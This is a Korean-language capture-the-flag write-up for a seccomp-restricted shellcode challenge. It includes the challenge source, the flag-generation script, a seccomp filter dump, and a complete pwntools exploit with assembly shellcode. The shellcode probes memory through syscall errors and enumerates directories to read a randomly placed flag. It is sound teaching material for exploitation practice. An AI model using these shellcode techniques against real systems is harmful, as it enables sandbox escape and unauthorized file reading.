# open_read_write

# Usage
 - docker-compose up -d 

# Concept
 - assembly shell coding with syscall errno

# Writeup

## prob.c
```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <stddef.h>

char init_reg[] = {
    "\x48\x31\xc0"
    "\x48\x31\xdb"
    "\x48\x31\xc9"
    "\x48\x31\xd2"
    "\x48\x31\xed"
    "\x48\x31\xe4"
    "\x48\x31\xff"
    "\x48\x31\xf6"
    "\x4d\x31\xc0"
    "\x4d\x31\xdb"
    "\x4d\x31\xc9"
    "\x4d\x31\xd2"
    "\x4d\x31\xed"
    "\x4d\x31\xe4"
    "\x4d\x31\xff"
    "\x4d\x31\xf6"
};

typedef struct {
    long start;
    long end;
    int len;
    char* perms;
} _maps;

typedef void (*func_ptr_t)(void);

_maps TO_BE_REMOVED[1000];
char remove_maps[0x1000];
void *MAPS[1000];
unsigned int RWX_IDX;
unsigned int RW_IDX;
long CNT;

void setup();
void gen_map();
void install_syscall_filter();
void go();

int main()
{
    setup();
    go();
}

void gen_map()
{
    int i;
    int prot;
    int rand_fd;
    void *ptr;

    rand_fd = open("/dev/urandom", 0);

    if ( rand_fd == -1 ) {
        puts("[-] ....");
        exit(-1);
    }

    read(rand_fd, &RWX_IDX, 4);
    read(rand_fd, &RW_IDX, 4);

    RWX_IDX %= 1000;
    RW_IDX %= 1000;

    if ( RWX_IDX == RW_IDX ) RW_IDX = (RW_IDX + 0x1337) % 1000;

    i = 0;
    while ( i < 1000 )
    {
        prot = 0;
        read(rand_fd, &ptr, 8);
        if ( i == RWX_IDX ) prot = PROT_WRITE | PROT_READ | PROT_EXEC;
        if ( i == RW_IDX ) {
            prot |= PROT_READ | PROT_WRITE;
            *(long*)&ptr = *(long*)&ptr % 0xFFFFFF000 + 0x200000000000;
        }

        *(long*)&ptr &= 0x7FFFFFFFF000;

        ptr = mmap(ptr, 0x4000, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if ( *(long*)&ptr == MAP_FAILED) continue;
            MAPS[i] = *(long*)&ptr;
        ++i;
    }
    sleep(1);
}

void setup()
{
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    setvbuf(stderr, NULL, 2, 0);
    puts("[+] generating...");
    gen_map();
    puts("[*] done!");
}

void install_syscall_filter() {
    // struct sock_filter filter[] = {
    //     BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 12),
    //     BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_getdents, 11, 0),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_read, 10, 0),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_write, 9, 0),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_exit, 8, 0),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_mprotect, 0, 2),
    //     BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
    //              offsetof(struct seccomp_data, args[2])),
    //     BPF_JUMP(BPF_JMP | BPF_JSET | BPF_K, PROT_WRITE, 0, 5),
    //     BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_openat, 0, 2),
    //     BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
    //              offsetof(struct seccomp_data, args[2])),
    //     BPF_JUMP(BPF_JMP | BPF_JSET | BPF_K, O_CREAT, 0, 1),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    // };

    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 17),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_getdents, 16, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_write, 15, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_exit, 14, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_mprotect, 0, 2),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, args[2])),
        BPF_JUMP(BPF_JMP | BPF_JSET | BPF_K, PROT_WRITE, 10, 11),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_openat, 0, 2),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, args[2])),
        BPF_JUMP(BPF_JMP | BPF_JSET | BPF_K, O_CREAT, 6, 7),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_read, 0, 4),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, args[0])),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0, 2, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 1, 1, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 2, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)");
        exit(1);
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
        perror("prctl(PR_SET_SECCOMP)");
        exit(1);
    }
}

void go()
{
    memcpy(MAPS[RWX_IDX], init_reg, sizeof(init_reg));
    printf("[+] ???: ");
    read(0, (MAPS[RWX_IDX] + sizeof(init_reg) - 1), 0x400);
    close(0);
    install_syscall_filter();
    mprotect(MAPS[RWX_IDX], 0x4000, PROT_EXEC);
    MAPS[RW_IDX] = NULL;
    ((func_ptr_t)MAPS[RWX_IDX])();
    puts("[+] I found the escaping impossible :(");
    exit(-1);
}

```

위 코드가 문제의 코드 전문입니다. 제공된 파일은 strip이 걸려있는 바이너리 뿐이긴 하지만 최적화나 패킹, 난독화 같은 방해요소는 없기 떄문에 쉽게 분석할 수 있습니다. (중간에 주석처리 된 부분이 있는데 seccomp rule을 느슨하게 작성했다가 uninteded solution의 방지를 위해 좀 더 strict하게 수정했습니다.)

```C
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x10 0x00 0x0000004e  if (A == getdents) goto 0020
 0004: 0x15 0x0f 0x00 0x00000001  if (A == write) goto 0020
 0005: 0x15 0x0e 0x00 0x0000003c  if (A == exit) goto 0020
 0006: 0x15 0x00 0x02 0x0000000a  if (A != mprotect) goto 0009
 0007: 0x20 0x00 0x00 0x00000020  A = prot # mprotect(start, len, prot)
 0008: 0x45 0x0a 0x0b 0x00000002  if (A & 0x2) goto 0019 else goto 0020
 0009: 0x20 0x00 0x00 0x00000000  A = sys_number
 0010: 0x15 0x00 0x02 0x00000101  if (A != openat) goto 0013
 0011: 0x20 0x00 0x00 0x00000020  A = flags # openat(dfd, filename, flags, mode)
 0012: 0x45 0x06 0x07 0x00000040  if (A & 0x40) goto 0019 else goto 0020
 0013: 0x20 0x00 0x00 0x00000000  A = sys_number
 0014: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0019
 0015: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0016: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0019
 0017: 0x15 0x01 0x00 0x00000001  if (A == 0x1) goto 0019
 0018: 0x15 0x00 0x01 0x00000002  if (A != 0x2) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```

또, 코드 상에서 seccomp rule을 설정해서 syscall을 제한하고 있으나, 위 처럼 `openat`, `read`, `write`같이 유용한 syscall들이 전부 allow되어있기 때문에 문제 이름처럼 단순한 orw challenge로 생각할 수 있습니다. (그러나 인자에 대한 몇 가지 제약이 있습니다. e.g, read의 fd 인자로는 stdin, stdout, stderr을 사용할 수 없는 등.. 때문에 user interaction이 들어간 작업은 불가능합니다.)

하지만 이 문제에는 몇 가지 난관이 있습니다.

1. 1000번 할당된 memory map 중에서 writable한 공간을 찾는 것. (혹은 pie, stack, libc, ld 등의 writable한 공간을 leak)
2. 매번 새롭게 generate되는 flag의 위치를 찾아내기.

위 두 가지가 헤쳐나가야 할 난관입니다.

## run.py
```py
import os
import binascii
import random
import subprocess

def create_and_move_to_chall_dir():
    chall_path = binascii.hexlify(os.urandom(16)).decode()

    try:
        os.mkdir(chall_path)
    except FileExistsError:
        print(f"Something's wrong. retry!")
        exit(-1)
    except OSError as e:
        print(f"Please contact admins. this should be a critical issue.")
        exit(-1)

    try:
        os.chdir(chall_path)
    except FileNotFoundError:
        print(f"Please contact admins. this should be a critical issue.")
        exit(-1)
    except PermissionError:
        print(f"Please contact admins. this should be a critical issue.")
        exit(-1)

    return chall_path

def gen_flag():
    flag_dir_idx = random.randint(0, 0xf)

    for i in range(0x10):
        path = binascii.hexlify(os.urandom(16)).decode()
        if flag_dir_idx == i:
            os.mkdir(path)
            flag_dir = path
            continue
        with open(path, 'w') as f:
            f.write('hmm... nice try... but... it\'s not flag :(')

    flag_path = f'{flag_dir}/{binascii.hexlify(os.urandom(16)).decode()}'

    with open(flag_path, 'w') as f:
        f.write(r'hspace{S05ry_t0_b0th3r_y0u..f0rg1v3_m3_pl3as3}')

def run(chall_path):
    try:
        subprocess.run('../prob', shell=True, timeout=45)
    except subprocess.TimeoutExpired:
        pass
    except:
        print(f"Please contact admins. this should be a critical issue.")
    print("[?] done?")

    try:
        os.chdir('../')
    except FileNotFoundError:
        print(f"Please contact admins. this should be a critical issue.")
        exit(-1)
    except PermissionError:
        print(f"Please contact admins. this should be a critical issue.")
        exit(-1)

    os.system(f"rm -rf {chall_path}")

def main():
    chall_path = create_and_move_to_chall_dir()
    gen_flag()
    run(chall_path)

if __name__ == '__main__':
    main()
```

문제의 설명에도 적혀있지만 해당 문제는 파일과 플래그가 매 실행마다 제네레이트 됩니다. 제네레이트는 위 `run.py`를 통해 실행됩니다. 즉, 매번 flag의 위치가 새롭게 변경되고, 그 경로는 `os.urandom`으로 생성하기 때문에 단순한 방법으로는 절대로 알아낼 수 없습니다. 게다가, fake file들도 매번 새로이 만들어지기 때문에 flag의 이름을 알아내기 위한 과정을 잘 거쳐야 합니다.

우리는 이 과정들은 syscall의 error들을 잘 활용해서 해결할 수 있습니다.

우선 writable한 공간을 어떻게 leak할 수 있을까요?

```C
        ...
        if ( i == RW_IDX ) {
            prot |= PROT_READ | PROT_WRITE;
            *(long*)&ptr = *(long*)&ptr % 0xFFFFFF000 + 0x200000000000;
        }
        ...
```

잠깐 다시 문제 코드를 보게 되면, RW_IDX에 공간을 할당할 때에는 `0x200000000000` ~ `0x200FFFFFF000`까지의 범위라는 꽤나 작은 범위 내로 주소를 결정합니다. 물론 이도 3byte이상 만큼의 랜덤이 보장되기 때문에 단순히 brute forcing으로는 해결하기 힘든 문제입니다. (게다가 `gen_map` 함수에서는 sleep을 사용하고 있어 brute force는 더더욱 힘듭니다.)

이 문제를 우리는 syscall의 error를 이용하여 해결할 수 있습니다. 우리가 일반적으로 `0x41414141`와 같이 유효하지 않은 주소에 읽기든 쓰기든 접근을 하려고 하면 `segmentation fault`가 발생하며 프로그램이 죽는 것이 일반적입니다. 하지만 syscall은 조금 다릅니다. syscall은 kernel level에서 명령을 처리하는데, 이 때, 인자로 넘겨진 userland address가 유효하지 않은 주소인 경우, 접근을 시도하는 것이 아니라 유효하지 않은 주소임을 알려주는 error number를 return value로 넘겨줍니다. 즉, 이 경우에는 **프로그램이 뻗지 않습니다.**

우리는 이를 통해서 `0x200FFFFFF000`이라는 주소부터 `0x1000`씩 값을 줄여가며 계속 read syscall을 호출해보면서 writable한 공간의 주소를 알아낼 수 있습니다. 여기서 read syscall을 호출할 때 fd의 인자는 앞서 open했던 `/dev/urandom`의 fd인 3번을 활용합니다. 

writable한 공간을 찾은 이후에는 openat syscall로 현재 디렉토리를 열고, getdents syscall로 현재 디렉토리의 모든 파일 이름들을 writable한 공간에 뿌려줄 수 있습니다.

여기서 어떻게 일반적인 file과 flag가 존재하는 디렉토리를 구분할 수 있을까요? 이 역시 read syscall의 errno를 통해 가능합니다.

일반적인 파일들은 모두 정말 파일이기 때문에, openat 이후 read를 진행해보면 읽어들인 바이트 수 만큼 반환값이 지정됩니다. 그러나, 우리가 openat syscall로 디렉토리를 열었을 경우, read를 진행하면 `EISDIR` 에러를 반환하게 됩니다. 우리는 이 점을 통해 어떤 파일이 flag가 존재하는 디렉토리인지 알아낼 수 있습니다.

이후에는 해당 directory를 한 번더 getdents해주고, flag의 이름을 확인해서 orw를 진행하면 됩니다.

다만 문제라면 한 쉘코드만에 이 과정을 모두 진행해야하는게... 문제이고, 그것을 잘 할 수 있는가를 질문한 문제입니다 ㅎㅎ. 풀이는 아래와 같으니 직접 디버깅 해보면서 따라가보시면 좋을 것 같습니다.

감사합니다.

## solve
```py
from pwn import *
context.arch='amd64'

e = ELF('./prob')
# p = e.process()
p = process(['python3', 'run.py'])
# p = remote('0', 10101)

pay = '''
mov rsi, 0x200FFFFFF000
mov rdi, 3
mov rdx, 4
find_map:
    xor rax, rax
    syscall
    cmp rax, 4
    je found_map
    sub rsi, 0x1000
    jmp find_map
found_map:
    sub rsi, 0x1000
    xor rsp, rsi
    xor rbp, rsi
    sub rsi, 0x2000
    xor rdi, rdi
    sub rdi, 100
    mov word ptr[rsi], 0x2f2e
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall
    mov rdi, rax
    add rsi, 0x2000
    mov rdx, 0x1000
    mov rax, 78
    syscall

    mov r15, rsi
find_dir:
    mov rsi, r15
    mov r14, qword ptr[rsi + 0x10]
    and r14, 0xffff
    cmp byte ptr[rsi+0x12], 0x2e
    je pass1
    xor rdi, rdi
    sub rdi, 100
    add rsi, 0x12
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall
    mov rdi, rax
    mov rsi, rbp
    add rsi, 0x1000
    mov rdx, 4
    xor rax, rax
    syscall
    cmp rax, 4
    jne found_dir
pass1:
    add r15, r14
    jmp find_dir

found_dir:
    mov r13, r15
    sub rsi, 0x2000
    mov rdx, 0x1000
    mov rax, 78
    syscall
    
    mov r15, rsi
find_flag:
    mov rsi, r15
    mov r14, qword ptr[rsi + 0x10]
    and r14, 0xffff
    cmp byte ptr[rsi+0x12], 0x2e
    je pass2
    jmp found_flag
pass2:
    add r15, r14
    jmp find_flag
found_flag:
    add rsi, 0x12
    sub rsi, 0x23
    add r13, 0x12
    mov word ptr[rsi], 0x2f2e
    add rsi, 2
    mov r12, qword ptr[r13]
    mov qword ptr[rsi], r12
    mov r12, qword ptr[r13+0x8]
    mov qword ptr[rsi+0x8], r12
    mov r12, qword ptr[r13+0x10]
    mov qword ptr[rsi+0x10], r12
    mov r12, qword ptr[r13+0x18]
    mov qword ptr[rsi+0x18], r12
    mov byte ptr[rsi + 0x20], 0x2f
    sub rsi, 2
    xor rdi, rdi
    sub rdi, 100
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall
    mov rdi, rax
    mov rsi, rbp
    add rsi, 0x1800
    mov rdx, 0x800
    xor rax, rax
    syscall
    mov rdi, 1
    mov rax, 1
    syscall
'''

p.sendafter(b'???: ', asm(pay))

p.interactive()
```